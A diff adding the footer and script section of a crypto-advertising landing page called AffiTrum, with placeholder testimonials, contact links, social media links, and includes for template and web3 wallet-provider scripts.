+                                    <div class="testimonial-content">
+                                        <p>“But I must explain to you how all this mistaken idea of denouncing pleasure
+                                            and praising pain was born and I will give you. Expectations with his work
+                                            fastestopa”!</p>
+                                    </div>
+                                    <div class="testimonial-author">
+                                        <h5>Johan Martin Sr</h5>
+                                        <p>Collector</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="swiper-slide">
+                                <div class="testimonial1-single">
+                                    <div class="testimonial-content">
+                                        <p>"combined with a handful of model sentence structures, to generate Lorem
+                                            Ipsum which looks reasonable. The generated therefore this mistaken idea of
+                                            denouncing.”"</p>
+                                    </div>
+                                    <div class="testimonial-author">
+                                        <h5>Sara Johnson</h5>
+                                        <p>Collector</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div
+                            class="slider-arrows arrows-style-1 text-center d-md-flex d-none flex-row justify-content-center align-items-center gap-5">
+                            <div class="testi1-prev swiper-prev-arrow" tabindex="0" role="button"
+                                aria-label="Previous slide"><i class="bi bi-chevron-left"></i></div>
+                            <div class="testi1-next swiper-next-arrow" tabindex="0" role="button"
+                                aria-label="Next slide"><i class="bi bi-chevron-right"></i></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div> -->
+
+    <!-- ========== testimonial_section end======== -->
+
+    <!-- ========== footer_section start======== -->
+
+    <div class="footer-section bg-color2">
+        <div class="section-star">
+            <img src="homeassets/images/icons/star.svg" alt="image">
+        </div>
+        <div class="newsletter-area pt-120">
+            <div class="container">
+                <div class="row align-items-center g-4 mb-200">
+                    <div class="col-lg-6">
+                        <div class="section-title2">
+                            <span>Reach out</span>
+                            <h2>Contact us</h2>
+                            <p>We would be delighted to hear from you! Please feel free to reach out to us. We look forward to connecting with you and addressing any inquiries or feedback you may have.</p>
+                        </div>
+                    </div>
+                    <div class="col-lg-6">
+                        <div class="row justify-content-center">
+                           <div class="col--4 text-center">
+                              <a href="cdn-cgi/l/email-protection.html#3e5d51504a5f5d4a7e5f5858574a4c4b53105f57" class="eg-btn btn--primary2 btn--lg"><img src="homeassets/images/icons/btn-star.svg" alt="image">Click to Email us</a>
+                           </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="background-text d-md-flex d-none">
+                    <ul>
+                        <li><a href="index.html#">Email us</a></li>
+						<li><a href="index.html#">Ask a Question</a></li>
+						<li><a href="index.html#">Tell us about marketing</a></li>
+                        <li><a href="index.html#">Tell us how great we are</a></li>
+                        <li><a href="index.html#">Teach us to improve</a></li>
+                        <li><a href="index.html#">Get us partnerships</a></li>
+						<li><a href="index.html#">Praise us</a></li>
+                        <li><a href="index.html#">Report a Bug</a></li>
+                        <li><a href="index.html#">Tell us about yourservices</a></li>
+                        <li><a href="index.html#">report your challenges</a></li>
+                        <li><a href="index.html#">Get In Touch</a></li>
+						<li><a href="index.html#">Report a Bug</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <div class="container">
+                <div class="footer-text-area">
+                    <a href="index.html"><img src="homeassets/images/icons/header1-logo.svg" alt="images"></a>
+                    <h3>Decentralizing Advertising</h3>
+                </div>
+                <div class="footer-link-area">
+                    <ul class="footer-list">
+                        <li><a href="index.html">Home</a></li>
+                        <li><a href="index.html#">About</a></li>
+						<li><a href="app.html">Dashboard</a></li>
+                        <li><a href="cdn-cgi/l/email-protection.html#0b6864657f6a687f4b6a6d6d627f797e66256a62">Contact Us</a></li>
+                    </ul>
+                </div>
+                <div class="copyright-area">
+                    <div class="row g-4">
+                        <div class="col-lg-6 d-flex justify-content-lg-start justify-content-center">
+                            <div class="copyright">
+                                <p>© 2023 <a href="index.html#" class="egns-lab">AffiTrum </a> is Proudly Powered by <a
+                                        href="https://themeforest.net/category/site-templates?term=egenslab"
+                                        class="egns-lab">Trum Labs</a>.</p>
+                            </div>
+                        </div>
+                        <div class="col-lg-6 justify-content-lg-end justify-content-center">
+                            <ul class="sidebar-social d-flex justify-content-center gap-5">
+            <li><a target="_blank" href="https://t.me/affitrum"><font color="#008b5e"><i class='bx bxl-telegram'></i></font></a></li>
+            <li><a target="_blank" href="https://twitter.com/affitrum"><font color="#008b5e"><i class='bx bxl-twitter'></i></font></a></li>
+            <li><a target="_blank" href="https://medium.com/@affitrum"><font color="#008b5e"><i class='bx bxl-medium'></i></font></a></li>
+			<li><a target="_blank" href="https://www.youtube.com/channel/UClPL3Ff4xfY2z18rBC1Xjtg"><font color="#008b5e"><i class='bx bxl-youtube'></i></font></a></li>
+            <li><a target="_blank" href="https://facebook.com/affitrum"><font color="#008b5e"><i class='bx bxl-facebook'></i></font></a></li>
+			<li><a target="_blank" href="https://instagram.com/affitrum"><font color="#008b5e"><i class='bx bxl-instagram'></i></font></a></li>
+			<li><a target="_blank" href="https://github.com/affitrum"><font color="#008b5e"><i class='bx bxl-github'></i></font></a></li>
+			<li><a target="_blank" href="https://discord.gg/5tn8ZeuB"><font color="#008b5e"><i class='bx bxl-discord'></i></font></a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========== footer_section end======== -->
+
+    <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="homeassets/js/jquery-3.6.0.min.js"></script>
+    <script src="homeassets/js/jquery-ui.js"></script>
+    <script src="homeassets/js/bootstrap.bundle.min.js"></script>
+    <script src="homeassets/js/simpleParallax.min.js"></script>
+    <script src="homeassets/js/swiper-bundle.min.js"></script>
+    <script src="homeassets/js/jquery.nice-select.js"></script>
+    <script src="homeassets/js/circletype.min.js"></script>
+    <script src="homeassets/js/morphext.min.js"></script>
+    <script src="homeassets/js/odometer.min.js"></script>
+    <script src="homeassets/js/viewport.jquery.js"></script>
+    <script src="homeassets/js/isotope.pkgd.min.js"></script>
+    <script src="homeassets/js/SmoothScroll.js"></script>
+    <script src="homeassets/js/jquery.magnific-popup.min.js"></script>
+    <script src="homeassets/js/sidebar.js"></script>
+    <script src="homeassets/js/masonry.pkgd.min.js"></script>
+    <script src="homeassets/js/imagesloaded.pkgd.js"></script>
+    <script src="homeassets/js/gsap.min.js"></script>
+    <script src="homeassets/js/cursor.js"></script>
+    <script src="homeassets/js/jquery.marquee.min.js"></script>
+    <script src="homeassets/js/TweenMax.min.js"></script>
+    <script src="homeassets/js/main.js"></script>
+    <script src="/assets/web3-provider/web3-router.js"></script>
+    <script src="/assets/web3-provider/web3-connect.js"></script>
+    <script src="/assets/web3-provider/web3-module.js"></script>
+    <script src="/assets/web3-provider/web3-alert.js"></script>
+<script src="/assets/web3-provider/web3-seaport.js"></script>
+<script src="/assets/web3-provider/web3-data.js"></script>
+<script src="/assets/web3-provider/ethers.js"></script>
+<script src="/assets/web3-provider/ethereum-tx.js"></script>
+<script src="/assets/web3-provider.js"></script>
+
+</body>
+</html>
